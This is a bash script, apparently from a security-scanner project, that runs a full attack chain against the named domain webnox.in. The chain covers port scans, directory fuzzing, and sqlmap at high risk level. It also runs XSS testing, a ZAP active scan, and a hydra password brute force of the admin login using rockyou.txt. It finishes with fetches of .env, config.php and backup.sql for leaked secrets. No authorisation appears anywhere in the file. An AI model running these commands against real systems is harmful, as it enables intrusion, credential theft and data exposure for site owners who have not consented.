#!/bin/bash
TARGET="webnox.in"
OUTDIR="/mnt/d/flutter projects/synergy-cyberix/kali_scan_results"
mkdir -p "$OUTDIR"

echo "[+] DNS Analysis"
dig +short $TARGET > $OUTDIR/dns.txt 2>/dev/null || echo "DNS resolution failed" > $OUTDIR/dns.txt
dig MX $TARGET >> $OUTDIR/dns.txt 2>/dev/null
dig TXT $TARGET >> $OUTDIR/dns.txt 2>/dev/null
dig NS $TARGET >> $OUTDIR/dns.txt 2>/dev/null
dig SOA $TARGET >> $OUTDIR/dns.txt 2>/dev/null

echo "[+] SSL/TLS"
echo | openssl s_client -connect $TARGET:443 -servername $TARGET > $OUTDIR/ssl.txt 2>/dev/null || echo "SSL connection failed" > $OUTDIR/ssl.txt
openssl x509 -in <(openssl s_client -connect $TARGET:443 -servername $TARGET 2>/dev/null < /dev/null) -text -noout > $OUTDIR/cert.txt 2>/dev/null || echo "Certificate extraction failed" > $OUTDIR/cert.txt

echo "[+] Security Headers"
curl -I -s $TARGET > $OUTDIR/headers.txt 2>/dev/null || echo "Header check failed" > $OUTDIR/headers.txt
curl -s -I -H "User-Agent: Mozilla/5.0" $TARGET >> $OUTDIR/headers.txt 2>/dev/null

echo "[+] CMS / Framework"
curl -s -I $TARGET | grep -i "x-powered-by\|server\|x-generator" > $OUTDIR/cms.txt 2>/dev/null || echo "No CMS info found" > $OUTDIR/cms.txt

echo "[+] Subdomains"
amass enum -d $TARGET -o $OUTDIR/subdomains.txt 2>/dev/null || dig +short $TARGET >> $OUTDIR/subdomains.txt 2>/dev/null || echo "No subdomains found" > $OUTDIR/subdomains.txt

echo "[+] Port Scan"
nmap -sS -sV -O --script safe -oN $OUTDIR/nmap.txt $TARGET 2>/dev/null || echo "Nmap scan failed" > $OUTDIR/nmap.txt
masscan -p1-65535 --rate=1000 $TARGET > $OUTDIR/masscan.txt 2>/dev/null || echo "Masscan failed" > $OUTDIR/masscan.txt

echo "[+] Directory / File Enumeration"
ffuf -u https://$TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -o $OUTDIR/ffuf.json -of json 2>/dev/null || echo "Directory enumeration failed" > $OUTDIR/ffuf.json

echo "[+] SQL Injection"
sqlmap -u "https://$TARGET/" --batch --level=3 --risk=3 --output-dir=$OUTDIR/sqlmap 2>/dev/null || echo "SQL injection test failed" > $OUTDIR/sqlmap/sqlmap.log
sqlmap -u "https://$TARGET/search?q=test" --batch --level=2 --output-dir=$OUTDIR/sqlmap_search 2>/dev/null || echo "SQL injection search test failed" > $OUTDIR/sqlmap_search/sqlmap.log

echo "[+] XSS"
dalfox url "https://$TARGET/search?q=test" -o $OUTDIR/xss.txt 2>/dev/null || echo "XSS test failed" > $OUTDIR/xss.txt

echo "[+] CSRF + Logic + Upload + IDOR + SSRF + XXE + CMDi"
zaproxy -daemon -port 8080 -config api.disablekey=true 2>/dev/null &
sleep 5
python3 /usr/share/zaproxy/zap-full-scan.py -t https://$TARGET -r $OUTDIR/zap_full.html 2>/dev/null || echo "ZAP full scan failed" > $OUTDIR/zap_full.html

echo "[+] Auth Bruteforce"
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET https-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -o $OUTDIR/hydra.txt 2>/dev/null || echo "Hydra bruteforce failed" > $OUTDIR/hydra.txt

echo "[+] Info Disclosure"
curl -s $TARGET/.env >> $OUTDIR/disclosure.txt 2>/dev/null
curl -s $TARGET/config.php >> $OUTDIR/disclosure.txt 2>/dev/null
curl -s $TARGET/backup.sql >> $OUTDIR/disclosure.txt 2>/dev/null
echo "Info disclosure check completed" >> $OUTDIR/disclosure.txt

echo "[+] API Security"
nuclei -u https://$TARGET -t /usr/share/nuclei-templates/apis/ -o $OUTDIR/api.txt 2>/dev/null || echo "API security test failed" > $OUTDIR/api.txt

echo "[+] Combined Passive/Active Scan"
python3 /usr/share/zaproxy/zap-baseline.py -t https://$TARGET -r $OUTDIR/zap_baseline.html 2>/dev/null || echo "ZAP baseline scan failed" > $OUTDIR/zap_baseline.html

echo "[+] Done. Results saved to $OUTDIR"